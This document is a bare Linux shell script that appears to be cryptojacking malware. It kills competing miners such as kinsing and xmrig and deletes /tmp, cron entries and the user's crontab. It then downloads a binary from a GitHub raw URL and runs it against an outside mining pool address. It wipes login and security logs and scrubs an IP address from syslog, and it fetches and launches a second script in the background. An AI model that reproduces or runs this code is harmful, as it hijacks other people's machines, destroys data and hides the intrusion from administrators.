export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/dev/shm
rm -rf /var/tmp/*
rm -rf /tmp/*
killall -q -9 /var/tmp/.postgres/*
ps aux | grep -v grep | grep 'runnerbus' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep 'rodolf.sh' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/tmp/system' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep 'kthzabor' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/tmp/kthmimu' | awk '{print $2}' | xargs -i kill -9 {}
crontab -r
rm -rf /tmp/.*
rm -rf /var/tmp/.*
rm -rf /etc/cron.hourly/oanacroner
rm -rf /etc/cron.hourly/oanacrona
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.daily/oanacrona
rm -rf /etc/cron.monthly/oanacroner
rm -rf xmrig-6.13.1/
rm -rf xmrig-6.13.1-linux-x64.tar.gz
rm -rf $HOME/moneroocean/
rm -rf /var/tmp/moneroocean/
rm -rf /root/moneroocean/
rm -rf $HOME/c3pool/
rm -rf /tmp/.tmp/xlog
rm -rf /var/tmp/.postgres
rm -rf /tmp/kwolker
rm -rf /tmp/kdevtmpfsi
rm -rf /tmp/kinsing
rm -rf /tmp/libexec
rm -rf /tmp/mym
rm -rf /usr/bin/kinsing*
rm -rf /etc/cron.d/kinsing*
ps aux | grep -v grep | grep 'postgres_start.sh' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/var/tmp/.postgres_start/postgres_start.sh' | awk '{print $2}' | xargs -i kill -9 {}
killall -q -9 workrun.sh
killall -q -9 /tmp/kwolker
killall -q -9 /tmp/mym
killall -q -9 xmr
killall -q -9 kdevtmpfsi
killall -q -9 kinsing
killall -q -9 xmrig
killall -q -9 minerd
killall -q -9 minerd
killall -q -9 xig
killall -q -9 cpuminer
pkill -9 kworker
pkill -9 kwolker
pkill -9 juma
sleep 1
if hash curl 2>/dev/null;then
    echo "has curl 1"
    curl --insecure https://raw.githubusercontent.com/mimu-pl/test/main/system.$(uname -m) -o /tmp/juma
else
    echo "haven't curl 1"
    python -c "import requests;url='https://raw.githubusercontent.com/mimu-pl/test/main/system';tmp=requests.get(url);open('./juma','wb').write(tmp.content)"
fi
chmod +x /tmp/juma
mkdir /tmp/.shanbe
echo > /var/log/wtmp
echo > /var/log/lastlog
echo >   /var/log/utmp
cat /dev/null >  /var/log/secure
cat /dev/null >  /var/log/message
sed  -i '/107.191.63.34/'d  /var/log/messages
sed -i 's/107.191.63.34/127.0.0.1/g' secure
cpu=$(nproc --all)
/tmp/juma -o 79.172.214.11:1212 -u $cpu.$HOSTNAME -B -k >/dev/null 2>&1
sleep 5
if hash curl 2>/dev/null;then
    echo "has curl 2"
    curl --insecure https://raw.githubusercontent.com/mimu-pl/test/main/sol.sh -o /tmp/.shanbe/rodolf.sh
else
    mkdir /tmp/.shanbe
    echo "haven't curl 2"
    python -c "import requests;url='https://raw.githubusercontent.com/mimu-pl/test/main/sol.sh';tmp=requests.get(url);open('/tmp/.shanbe/rodolf.sh','wb').write(tmp.content)"
fi
sleep 1
chmod +x /tmp/.shanbe/rodolf.sh
nohup /tmp/.shanbe/rodolf.sh >/dev/null 2>&1 &
rm -rf ./run.sh
